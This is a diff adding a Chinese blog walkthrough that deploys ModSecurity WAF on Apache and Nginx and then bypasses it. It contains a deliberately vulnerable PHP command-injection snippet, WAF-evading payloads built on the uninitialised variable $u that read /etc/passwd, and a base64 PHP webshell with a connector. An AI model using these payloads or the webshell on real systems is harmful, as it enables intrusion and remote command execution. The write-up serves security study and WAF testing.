@@ -1,0 +1,214 @@
+<h1 id="分享modsecwaf老牌开源waf的绕过历程">「分享」ModsecWAF：老牌开源waf的绕过历程</h1>
+
+<h2 id="目录">目录</h2>
+<ul>
+  <li><a href="#%E5%88%86%E4%BA%ABmodsecwaf%E8%80%81%E7%89%8C%E5%BC%80%E6%BA%90waf%E7%9A%84%E7%BB%95%E8%BF%87%E5%8E%86%E7%A8%8B">「分享」ModsecWAF：老牌开源waf的绕过历程</a>
+    <ul>
+      <li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li>
+      <li><a href="#%E9%9B%B6%E8%BF%9E%E5%96%8A%E4%B8%89%E5%A3%B0waf">零：连喊三声「WAF」</a>
+        <ul>
+          <li><a href="#0x01-%E6%8B%BF%E6%9D%A5waf">0x01 拿来WAF</a></li>
+          <li><a href="#0x02-%E9%83%A8%E7%BD%B2waf">0x02 部署WAF</a>
+            <ul>
+              <li><a href="#apache%E9%83%A8%E7%BD%B2">#Apache部署</a></li>
+              <li><a href="#nginx%E9%83%A8%E7%BD%B2">#Nginx部署</a></li>
+            </ul>
+          </li>
+          <li><a href="#0x03-%E7%BB%95%E8%BF%87waf">0x03 绕过WAF</a>
+            <ul>
+              <li><a href="#%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87">#未初始变量进行绕过</a></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li><a href="#%E4%B8%80%E7%BC%96%E5%86%99poc%E8%84%9A%E6%9C%AC%E8%BF%9E%E6%8E%A5%E5%99%A8">一：编写poc脚本连接器</a></li>
+      <li><a href="#%E7%94%B3%E6%98%8E">申明</a></li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<ul>
+  <li>WAF部署
+    <ul class="task-list">
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />modSec waf apache链接</li>
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />modSec waf nginx链接</li>
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />ModSec 规则库Lua编写熟悉</li>
+    </ul>
+  </li>
+  <li>WAF绕过
+    <ul class="task-list">
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />未初始变量进行绕过</li>
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />基本规则探测、效果匹配</li>
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />简单样例尝试</li>
+    </ul>
+  </li>
+  <li>WEB SHELL连接器
+    <ul class="task-list">
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />给👴连！</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="零连喊三声waf">零：连喊三声「WAF」</h2>
+
+<h3 id="0x01-拿来waf">0x01 拿来WAF</h3>
+<p>依稀记得高中的一位物理老师的一段话，就拿这段话来开始吧；背景是当时刚学物理课程，很多人学会物理公式仅限于会用，他们在课堂上对我们的物理老师表达出了焦虑。
+当然，研究生学历的物理老师对于这种学习上的困扰必然是经历过，然后提出了下面的观点，原话记不太清了，所以只能大概表述出意思：</p>
+
+<blockquote>
+  <p>我知道你们现在有些迷茫，当然也是正常的。但是你们要想在某些领域上有所建树、突破，就要学会站在巨人的肩膀上看这个世界，鲁迅提出的拿来主义我觉得很适合用来学物理；
+<strong>不管这些物理公式为什么是这样的、怎么得来的，先拿来用。</strong></p>
+</blockquote>
+
+<p>「拿来主义」：</p>
+<blockquote>
+  <p>是民国时期面对外来文化的冲击和中国封建时代遗留下来的文化，如何选择和取舍，于当时中国流行的闭关主义和全面西化的不同呼声；
+<strong>鲁迅主张，既非被动地被“送去”，亦非不加分析地“拿来”，而是通过实用主义的观点选择性的“拿来”。</strong></p>
+</blockquote>
+
+<p>所以我想：针对WAF也可以这样来学习，不知道WAF的工作原理没有关系，我们先把开源的WAF拿过来用，用了才知道WAF的优点、缺点；</p>
+
+<p>同样的：只有用过之后，我们看到拦截日志后可以知道WAF的正则表达规则库，可以对WAF的工作方式有一些了解。</p>
+
+<h3 id="0x02-部署waf">0x02 部署WAF</h3>
+<p>APACHE:
+<a href="https://zhuanlan.zhihu.com/p/104931385">手把手带你搭建企业级WEB防火墙ModSecurity3.0+Apache</a></p>
+
+<p>NGINX:
+<a href="https://zhuanlan.zhihu.com/p/80866123">手把手带你搭建企业级WEB防火墙ModSecurity3.0+Nginx</a></p>
+
+<hr />
+
+<h4 id="apache部署">#Apache部署</h4>
+<p>没什么好说的，跟着教程一步步走基本上都能搞定。直接上部署成功的图：</p>
+
+<p><img src="/static/web-image/waf/apache-modsec-waf.png" alt="waf-apache" />
+如上图，部署成功后可以看到访问<code class="language-plaintext highlighter-rouge">http://localhost?doc=/bin/ls</code>，WAF给出拦截操作，日志记录提示触发了<code class="language-plaintext highlighter-rouge">unix-shell.data</code>规则导致拦截返回403；</p>
+
+<h4 id="nginx部署">#Nginx部署</h4>
+<p><img src="/static/web-image/waf/nginx-modsec-waf.png" alt="waf-apache" />
+同样的：访问<code class="language-plaintext highlighter-rouge">localhost:8011/?and 1=2--+</code>，触发WAF拦截规则返回403；需要注意的是：</p>
+<ul>
+  <li>nginx版本，教程中推荐的1.9版本实际操作下来无法成功编译安装，这里推荐<code class="language-plaintext highlighter-rouge">nginx/1.13.8</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">wget http://nginx.org/download/nginx-1.13.8.tar.gz</code></li>
+    </ul>
+  </li>
+  <li>环境lib库安装：
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">sudo apt-get install openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev autoconf automake libtool gcc g++ make</code></li>
+    </ul>
+  </li>
+  <li>[tips]以下四条命令的含义：
+    <ul>
+      <li>
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-ie</span> <span class="s1">'s/SecDefaultAction "phase:1,log,auditlog,pass"/#SecDefaultAction "phase:1,log,auditlog,pass"/g'</span> crs-setup.conf
+  <span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-ie</span> <span class="s1">'s/SecDefaultAction "phase:2,log,auditlog,pass"/#SecDefaultAction "phase:2,log,auditlog,pass"/g'</span> crs-setup.conf
+  <span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-ie</span> <span class="s1">'s/#.*SecDefaultAction "phase:1,log,auditlog,deny,status:403"/SecDefaultAction "phase:1,log,auditlog,deny,status:403"/g'</span> crs-setup.conf
+  <span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-ie</span> <span class="s1">'s/# SecDefaultAction "phase:2,log,auditlog,deny,status:403"/SecDefaultAction "phase:2,log,auditlog,deny,status:403"/g'</span> crs-setup.conf
+</code></pre></div>        </div>
+      </li>
+      <li>将下面查看<code class="language-plaintext highlighter-rouge">crs-setup.conf</code>文件输出中1、2行（下文2、3行）的内容注释，文件中5、6行（下文6、7行）取消注释；
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">cat </span>crs-setup.conf|grep SecDefaultAction
+  <span class="c">#SecDefaultAction "phase:1,log,auditlog,pass"</span>
+  <span class="c">#SecDefaultAction "phase:2,log,auditlog,pass"</span>
+  <span class="c"># SecDefaultAction "phase:1,nolog,auditlog,pass"</span>
+  <span class="c"># SecDefaultAction "phase:2,nolog,auditlog,pass"</span>
+  SecDefaultAction <span class="s2">"phase:1,log,auditlog,deny,status:403"</span>
+  SecDefaultAction <span class="s2">"phase:2,log,auditlog,deny,status:403"</span>
+  <span class="c"># SecDefaultAction "phase:1,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host: %{request_headers.host}'"</span>
+  <span class="c"># SecDefaultAction "phase:2,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host: %{request_headers.host}'"</span>
+</code></pre></div>        </div>
+        <p>其他根据教程往下走即可。</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="0x03-绕过waf">0x03 绕过WAF</h3>
+
+<h4 id="未初始变量进行绕过">#未初始变量进行绕过</h4>
+<p>跟随大佬们的脚步走，使用简单的php代码进行WAF测试：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+        <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nb">system</span><span class="p">(</span><span class="s1">'dig'</span><span class="mf">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]);</span>
+        <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>如上代码尝试绕过WAF。我们知道终端执行<code class="language-plaintext highlighter-rouge">dig www.baidu.com;cat /etc/passwd</code>实际执行如下：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig www.baidu.com<span class="p">;</span><span class="nb">cat</span> /etc/passwd
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.10.6 &lt;&lt;<span class="o">&gt;&gt;</span> www.baidu.com
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 27659
+;; flags: qr rd; QUERY: 1, ANSWER: 3, AUTHORITY: 5, ADDITIONAL: 4
+;; WARNING: recursion requested but not available
+···
+···
+···
+# Open Directory.
+##
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+··
+··
+_oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false
+</span></code></pre></div></div>
+<p>在终端下相同作用的链接符号还有<code class="language-plaintext highlighter-rouge">&amp;&amp;</code>；</p>
+
+<p>直接传参<code class="language-plaintext highlighter-rouge">www.baidu.com;cat+/etc/passwd</code>注入明显的攻击行为直接返回403，查看日志匹配到以下特征：</p>
+<ul>
+  <li>1、<code class="language-plaintext highlighter-rouge">"Operator Rx' with parameter ^[\d.:]+$' against variable</code>，存在运算符；</li>
+  <li>2、<code class="language-plaintext highlighter-rouge">Operator PmFromFile' with parameter lfi-os-files.data'</code>，正则匹配到lfi-os-files的规则库；</li>
+  <li>3、<code class="language-plaintext highlighter-rouge">characters omitted</code>，特殊字符；</li>
+  <li>4、<code class="language-plaintext highlighter-rouge">"Operator PmFromFile' with parameter unix-shell.data'</code>，正则匹配到unix-shell的规则库；</li>
+  <li>5、<code class="language-plaintext highlighter-rouge">Operator Ge' with parameter 5'</code>，同样为存在运算符。
+所以根据以上特征进行规则探测并注入fuzz：</li>
+</ul>
+
+<hr />
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">+$u+cat+/$uetc/$upasswd$u</code></li>
+  <li><code class="language-plaintext highlighter-rouge">+$ucat+$u/etc$u/passwd</code>
+以上都返回200，但是没有回显，说明命令写的不对；</li>
+</ul>
+
+<p>实际测试<code class="language-plaintext highlighter-rouge">/etc</code>、<code class="language-plaintext highlighter-rouge">/passwd</code>和特殊字符等不能单独出现，所以使用未初始变量<code class="language-plaintext highlighter-rouge">$u</code>包住后进行注入；
+下面是实际生效的payload：</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">+$u+cat+/etc$u/passwd$u</code></li>
+  <li><code class="language-plaintext highlighter-rouge">+$u+cat+$u/etc$u/passwd</code>
+<img src="/static/web-image/waf/waf-bypass-exec-command.png" alt="waf-bypass-exec" /></li>
+</ul>
+
+<h2 id="一编写poc脚本连接器">一：编写poc脚本连接器</h2>
+
+<p>通过以上绕过首发即可执行任意代码，我们可以直接写入一句话木马，但是这不是本段的重点；</p>
+
+<p>本段的重点是通过实际测试发现base64编码后可以完美绕过waf，所以可以直接写入一个base64的马，然后连接，实际上就是解决实现一个webshell连接器，实现
+功能类似一个蚁剑的cmd连接功能；这样以来WAF就形同虚设了。
+webshell代码：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'CMD'</span><span class="p">]));</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+<ul>
+  <li>GET/POST请求传入cmd</li>
+  <li>base64加密参数内容</li>
+  <li>类似终端执行代码
+实现效果如下：
+<img src="/static/web-image/waf/waf-bypass-shell.png" alt="waf-bypass-shell" />
+参考的是[@IppSec]的代码，简单修改了部分。
+<a href="https://github.com/IppSec/forward-shell/blob/master/forward-shell.py">参考代码</a></li>
+</ul>
+
+<hr />
+
+<h2 id="申明">申明</h2>
+
+<p>作者：Bin4xin</p>
+
+<p>转载请申明本文链接：<a href="/help/Mod-Waf-Bypass-Walkthrough/">「分享」ModsecWAF：老牌开源waf的绕过历程</a></p>
